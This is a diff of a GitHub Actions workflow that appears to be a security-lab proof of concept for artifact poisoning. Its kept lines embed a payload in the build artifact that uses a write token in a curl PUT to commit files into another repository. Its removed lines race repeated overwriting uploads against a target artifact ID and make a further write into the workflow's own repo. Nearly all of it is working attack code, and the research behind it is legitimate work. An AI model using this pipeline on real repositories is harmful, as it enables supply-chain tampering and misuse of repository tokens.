@@ -3,8 +3,6 @@ on: pull_request
 jobs:
   build:
     runs-on: ubuntu-latest
-    env:
-      GH_TOKEN: ${{ github.token }}
     steps:
       - run: |
           mkdir -p dist
@@ -13,150 +11,14 @@ jobs:
           echo "CONSUMER_RUN=${GITHUB_RUN_ID} ACTOR=${GITHUB_TRIGGERING_ACTOR}"
           echo "SEEN_LEN=${#LAB_SECRET}"
           printf %s "$LAB_SECRET" | sha256sum | cut -c1-24 | sed "s/^/SEEN_HASH=/"
-          echo "TOKEN_PRESENT=$([ -n "$LAB_WRITE_TOKEN" ] && echo yes || echo no)"
           BODY=$(printf '{"content":"%s","message":"executed-script-write"}' "$(printf 'written by code that arrived inside the artifact\n' | base64 | tr -d '\n')")
           CODE=$(curl -s -o /tmp/exec1.json -w '%{http_code}' -X PUT -H "Authorization: Bearer $LAB_WRITE_TOKEN" -d "$BODY" "https://api.github.com/repos/boshjerns/vercel-lab-b/contents/executed-script-write-${GITHUB_RUN_ID}.md")
           echo "EXEC_WRITE_SECOND_REPO=$CODE"
-          SHA=$(python3 -c "import json;print(json.load(open('/tmp/exec1.json')).get('commit',{}).get('sha','none'))" 2>/dev/null || echo none)
-          echo "EXEC_COMMIT=$SHA"
-          CODE2=$(curl -s -o /dev/null -w '%{http_code}' -X PUT -H "Authorization: Bearer $LAB_WRITE_TOKEN" -d "$BODY" "https://api.github.com/repos/boshjerns/vercel-lab/contents/executed-script-write-${GITHUB_RUN_ID}.md")
-          echo "EXEC_WRITE_OWN_REPO=$CODE2"
           PAYLOAD
           echo 'lane-6 payload' > dist/marker.txt
           echo "run=${GITHUB_RUN_ID} lane=6" >> dist/build.sh
-          TARGET=$(gh api "/repos/${GITHUB_REPOSITORY}/actions/artifacts?per_page=1" --jq ".artifacts[0].id")
-          echo "TARGET=$TARGET" >> $GITHUB_ENV
+          echo "FORK_UPLOAD_START=$(date -u +%H:%M:%S)"
       - uses: actions/upload-artifact@v4
-        id: u1
-        if: env.STOP != 'true'
         with:
           name: build
           path: dist
-          overwrite: true
-      - run: |
-          NEW=${{ steps.u1.outputs.artifact-id }}
-          echo "draw=$NEW"
-          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
-      - uses: actions/upload-artifact@v4
-        id: u2
-        if: env.STOP != 'true'
-        with:
-          name: build
-          path: dist
-          overwrite: true
-      - run: |
-          NEW=${{ steps.u2.outputs.artifact-id }}
-          echo "draw=$NEW"
-          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
-      - uses: actions/upload-artifact@v4
-        id: u3
-        if: env.STOP != 'true'
-        with:
-          name: build
-          path: dist
-          overwrite: true
-      - run: |
-          NEW=${{ steps.u3.outputs.artifact-id }}
-          echo "draw=$NEW"
-          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
-      - uses: actions/upload-artifact@v4
-        id: u4
-        if: env.STOP != 'true'
-        with:
-          name: build
-          path: dist
-          overwrite: true
-      - run: |
-          NEW=${{ steps.u4.outputs.artifact-id }}
-          echo "draw=$NEW"
-          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
-      - uses: actions/upload-artifact@v4
-        id: u5
-        if: env.STOP != 'true'
-        with:
-          name: build
-          path: dist
-          overwrite: true
-      - run: |
-          NEW=${{ steps.u5.outputs.artifact-id }}
-          echo "draw=$NEW"
-          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
-      - uses: actions/upload-artifact@v4
-        id: u6
-        if: env.STOP != 'true'
-        with:
-          name: build
-          path: dist
-          overwrite: true
-      - run: |
-          NEW=${{ steps.u6.outputs.artifact-id }}
-          echo "draw=$NEW"
-          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
-      - uses: actions/upload-artifact@v4
-        id: u7
-        if: env.STOP != 'true'
-        with:
-          name: build
-          path: dist
-          overwrite: true
-      - run: |
-          NEW=${{ steps.u7.outputs.artifact-id }}
-          echo "draw=$NEW"
-          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
-      - uses: actions/upload-artifact@v4
-        id: u8
-        if: env.STOP != 'true'
-        with:
-          name: build
-          path: dist
-          overwrite: true
-      - run: |
-          NEW=${{ steps.u8.outputs.artifact-id }}
-          echo "draw=$NEW"
-          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
-      - uses: actions/upload-artifact@v4
-        id: u9
-        if: env.STOP != 'true'
-        with:
-          name: build
-          path: dist
-          overwrite: true
-      - run: |
-          NEW=${{ steps.u9.outputs.artifact-id }}
-          echo "draw=$NEW"
-          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
-      - uses: actions/upload-artifact@v4
-        id: u10
-        if: env.STOP != 'true'
-        with:
-          name: build
-          path: dist
-          overwrite: true
-      - run: |
-          NEW=${{ steps.u10.outputs.artifact-id }}
-          echo "draw=$NEW"
-          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
-      - uses: actions/upload-artifact@v4
-        id: u11
-        if: env.STOP != 'true'
-        with:
-          name: build
-          path: dist
-          overwrite: true
-      - run: |
-          NEW=${{ steps.u11.outputs.artifact-id }}
-          echo "draw=$NEW"
-          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
-      - uses: actions/upload-artifact@v4
-        id: u12
-        if: env.STOP != 'true'
-        with:
-          name: build
-          path: dist
-          overwrite: true
-      - run: |
-          NEW=${{ steps.u12.outputs.artifact-id }}
-          echo "draw=$NEW"
-          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
-      - run: |
-          echo "BEAT_TARGET=${BEAT_TARGET:-none}"
